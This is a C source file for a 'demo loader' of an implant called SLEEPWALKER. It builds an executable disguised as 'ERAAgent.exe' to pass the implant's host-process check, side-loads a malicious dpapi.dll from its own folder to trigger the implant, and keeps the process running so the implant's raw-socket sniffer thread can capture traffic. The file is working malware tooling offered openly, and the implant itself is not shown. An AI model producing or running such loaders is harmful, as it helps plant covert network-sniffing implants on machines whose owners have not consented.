/*
 * launcher.c - demo loader for the SLEEPWALKER implant.
 *
 * Builds to an exe that must be NAMED "ERAAgent.exe" (the implant's host-
 * process check) and placed in the same directory as dpapi.dll.  It loads
 * dpapi.dll from its own directory, triggering the implant's DllMain (and,
 * on the SW_DEMO build, the bypassed name check), then keeps the process
 * alive so the raw-socket sniffer thread can run.
 *
 * Build:  x86_64-w64-mingw32-gcc -m64 -O2 tools/launcher.c -o out/demo/ERAAgent.exe
 */

#include <windows.h>
#include <wchar.h>
#include <stdio.h>

int main(void) {
    /* Resolve the exe's own directory so dpapi.dll is found beside it even
     * when the working directory differs. */
    wchar_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(NULL, path, MAX_PATH);
    if (!n || n >= MAX_PATH) {
        wprintf(L"failed to resolve module path\n");
        return 1;
    }
    wchar_t *slash = wcsrchr(path, L'\\');
    if (slash) *(slash + 1) = L'\0';
    wcscat(path, L"dpapi.dll");

    HMODULE h = LoadLibraryW(path);
    if (!h) {
        wprintf(L"failed to load dpapi.dll (err=%lu)\n", GetLastError());
        return 1;
    }
    wprintf(L"loaded dpapi.dll at %p - press Ctrl+C to stop\n", (void *)h);
    fflush(stdout);

    /* Keep the process alive so the implant's worker/sniffer threads run. */
    for (;;) Sleep(10000);
    return 0;
}
